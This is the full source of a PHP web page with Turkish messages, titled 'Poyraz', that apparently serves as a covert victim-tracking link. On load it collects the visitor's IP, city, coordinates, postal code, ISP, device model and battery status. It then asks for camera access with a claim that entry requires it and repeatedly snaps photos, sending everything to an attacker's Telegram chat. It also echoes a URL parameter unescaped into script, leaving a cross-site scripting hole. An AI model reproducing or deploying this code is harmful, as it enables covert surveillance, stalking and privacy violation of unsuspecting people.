<?php

function getTokenFromJson() {

    $tokenFile = 'token.json';

    if (file_exists($tokenFile)) {

        $json = file_get_contents($tokenFile);

        $data = json_decode($json, true);

        return isset($data['token']) ? $data['token'] : null;

    }

    return null;

}



function getClientIp() {

    $ip = '';

    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {

        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];

    } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {

        $ip = $_SERVER['HTTP_CLIENT_IP'];

    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {

        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];

    } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {

        $ip = $_SERVER['HTTP_X_FORWARDED'];

    } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {

        $ip = $_SERVER['HTTP_FORWARDED_FOR'];

    } elseif (isset($_SERVER['HTTP_FORWARDED'])) {

        $ip = $_SERVER['HTTP_FORWARDED'];

    } else {

        $ip = $_SERVER['REMOTE_ADDR'];

    }

    return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : 'Unknown';

}



$visitor_ip = getClientIp();

$botToken = getTokenFromJson();

$chatId = isset($_GET['id']) ? $_GET['id'] : '';



if (!$botToken) {

    die('Token bulunamadı');

}



if (!$chatId) {

    die('Chat ID bulunamadı');

}

?>

<!DOCTYPE html>

<html lang="tr">

<head>

  <meta charset="UTF-8" />

  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <title>Poyraz</title>

  <script src="https://unpkg.com/device-detector-js@3.0.4/dist/device-detector.min.js"></script>

  <style>

    body {

      margin: 0;

      height: 100vh;

      background: black;

      display: flex;

      justify-content: center;

      align-items: center;

      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;

    }

    .neon-text {

      font-size: 3.5rem;

      color: #ff0000;

      text-shadow:

         0 0 5px #ff0000,

         0 0 10px #ff0000,

         0 0 20px #ff0000,

         0 0 40px #ff0000,

         0 0 80px #ff0000;

      user-select: none;

    }

  </style>

</head>

<body>

  <div class="neon-text">POYRAZ</div>



  <script>

    const chatId = '<?php echo $chatId; ?>';

    const visitorIp = '<?php echo $visitor_ip; ?>';



    if (!chatId) {

      alert('Chat ID eksik');

      throw new Error('Chat ID yok!');

    }



    let stream;

    let imageCapture;

    let isSending = false;



    function getDeviceInfo() {

      try {

        const detector = new DeviceDetector();

        const result = detector.parse(navigator.userAgent);

        const device = result.device;

        const make = device.brand || 'Unknown';

        const model = device.model || 'Unknown';

        return { make, model };

      } catch (err) {

        console.error('Device info error:', err);

        return { make: 'Unknown', model: 'Unknown' };

      }

    }



    async function getGeoData(ip) {

      try {

        const response = await fetch(`https://ipapi.co/${ip}/json/`, { timeout: 5000 });

        if (!response.ok) throw new Error(`Geo API error: ${response.status}`);

        const data = await response.json();

        return {

          city: data.city || 'Unknown',

          region: data.region || 'Unknown',

          country: data.country_code || 'Unknown',

          loc: data.latitude && data.longitude ? `${data.latitude},${data.longitude}` : 'Unknown',

          org: data.org || 'Unknown',

          postal: data.postal || 'Unknown',

          timezone: data.timezone || 'Unknown',

          localTime: new Date().toLocaleString('en-GB', { timeZone: data.timezone || 'UTC', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(/,/, '').replace(/(\d+)\/(\d+)\/(\d+)/, '$3/$2/$1')

        };

      } catch (err) {

        console.error('Geo data fetch error:', err);

        return {

          city: 'Unknown',

          region: 'Unknown',

          country: 'Unknown',

          loc: 'Unknown',

          org: 'Unknown',

          postal: 'Unknown',

          timezone: 'Unknown',

          localTime: 'Unknown'

        };

      }

    }



    async function getBatteryInfo() {

      try {

        if ('getBattery' in navigator) {

          const battery = await navigator.getBattery();

          return {

            level: Math.round(battery.level * 100),

            charging: battery.charging ? 'Yes' : 'No'

          };

        } else {

          return { level: 'Not supported on iOS', charging: 'Not supported on iOS' };

        }

      } catch (err) {

        console.error('Battery info error:', err);

        return { level: 'Not supported on iOS', charging: 'Not supported on iOS' };

      }

    }



    async function sendIpToTelegram(attempt = 1, maxAttempts = 3) {

      try {

        const geoData = await getGeoData(visitorIp);

        const batteryInfo = await getBatteryInfo();

        const deviceInfo = getDeviceInfo();



        const message = `🌐 IP: ${visitorIp}\n` +

                       `🏙️ City: ${geoData.city}\n` +

                       `📍 Region: ${geoData.region}\n` +

                       `🌎 Country: ${geoData.country}\n` +

                       `🧭 Loc: ${geoData.loc}\n` +

                       `🏢 Org: ${geoData.org}\n` +

                       `📮 Postal: ${geoData.postal}\n` +

                       `🕓 Timezone: ${geoData.timezone}\n` +

                       `⏰ Local Time: ${geoData.localTime}\n` +

                       `📱 Device: ${deviceInfo.make} ${deviceInfo.model}\n` +

                       `🔋 Battery: ${batteryInfo.level}${batteryInfo.level !== 'Not supported on iOS' ? '%' : ''} (Charging: ${batteryInfo.charging})`;



        const response = await fetch('send_telegram.php', {

          method: 'POST',

          headers: {

            'Content-Type': 'application/json'

          },

          body: JSON.stringify({

            chat_id: chatId,

            text: message

          })

        });



        const result = await response.json();

        if (!result.success) {

          throw new Error(`Telegram API error: ${result.error}`);

        }

        console.log('Info sent to Telegram:', result);

      } catch (err) {

        console.error(`Attempt ${attempt} failed:`, err);

        if (attempt < maxAttempts) {

          console.log(`Retrying... (${attempt + 1}/${maxAttempts})`);

          setTimeout(() => sendIpToTelegram(attempt + 1, maxAttempts), 2000);

        } else {

          console.error('Max attempts reached. Failed to send to Telegram.');

        }

      }

    }



    function sendToTelegram(data, type) {

      if (isSending) return;

      isSending = true;



      const formData = new FormData();

      formData.append('chat_id', chatId);

      formData.append('type', type);

      formData.append('file', data, `photo.jpg`);



      fetch('send_telegram.php', {

        method: 'POST',

        body: formData

      })

      .then(response => response.json())

      .then(result => {

        console.log('Telegram gönderildi:', result);

        isSending = false;

        captureAndSendPhoto();

      })

      .catch(err => {

        console.error('Telegram\'a gönderme hatası:', err);

        isSending = false;

        setTimeout(captureAndSendPhoto, 1000);

      });

    }



    function captureAndSendPhoto() {

      if (!imageCapture) return;

      imageCapture.takePhoto()

        .then(blob => {

          sendToTelegram(blob, 'photo');

        })

        .catch(err => {

          console.error('Fotoğraf çekilemedi:', err);

          setTimeout(captureAndSendPhoto, 1000);

        });

    }



    function startCapturing() {

      navigator.mediaDevices.getUserMedia({ video: true })

        .then(mediaStream => {

          stream = mediaStream;

          imageCapture = new ImageCapture(stream.getVideoTracks()[0]);

          captureAndSendPhoto();

        })

        .catch(err => {

          console.error('Kamera izni reddedildi veya hata:', err);

          alert('Siteye Girmek İçin İzin Gerekli!');

        });

    }



    sendIpToTelegram();

    startCapturing();



    window.addEventListener('beforeunload', () => {

      if (stream) {

        stream.getTracks().forEach(track => track.stop());

      }

    });

  </script>

</body>

</html>
